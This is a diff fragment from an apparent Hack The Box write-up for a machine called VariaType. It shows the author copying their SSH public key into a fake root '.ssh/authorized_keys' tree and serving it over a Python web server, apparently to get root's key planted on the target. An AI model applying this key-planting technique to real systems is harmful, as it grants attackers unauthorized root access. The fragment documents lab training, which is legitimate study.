@@ -2162,7 +2162,16 @@ root_key  root_key.pub
 **Output:**
 
 ```shell
+┌──(kali㉿kali)-[~/PUEMAN/HTB/SN10/VariaType]
+└─$ cp root_key.pub ./root/.ssh/authorized_keys
 
+┌──(kali㉿kali)-[~/PUEMAN/HTB/SN10/VariaType]
+└─$ tree -a ./root
+./root
+└── .ssh
+    └── authorized_keys
+
+2 directories, 1 file
 ```
 
 `python3 -m http.server 80`: Launches a lightweight web server on port 80 to host the "fake" root directory.
